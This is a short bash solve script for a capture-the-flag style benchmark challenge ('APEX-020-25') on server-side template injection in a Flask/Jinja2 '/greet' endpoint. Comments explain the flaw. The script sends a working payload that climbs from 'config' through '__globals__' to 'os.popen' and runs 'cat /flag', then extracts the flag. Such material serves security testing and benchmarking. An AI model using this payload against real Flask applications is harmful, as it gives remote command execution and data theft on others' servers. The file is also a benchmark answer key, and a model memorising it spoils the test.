#!/usr/bin/env bash
# APEX-020-25 — "Server-Side Template Injection (Jinja2)" (tags: ssti, rce)
#
# `/greet` builds its template by putting the name into the template *source*
# rather than passing it as a variable, so anything between `{{` and `}}` is
# evaluated by Jinja2 with the application's own globals. Flask puts `config`
# in every template context, `Config` is defined in a module that imports `os`,
# and a function's `__globals__` is its module's namespace — so `os` is three
# attribute lookups from a name the template is *supposed* to have.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex020-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

PAYLOAD="{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}"

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create --set path=/greet --set "query.name=$PAYLOAD" | flag
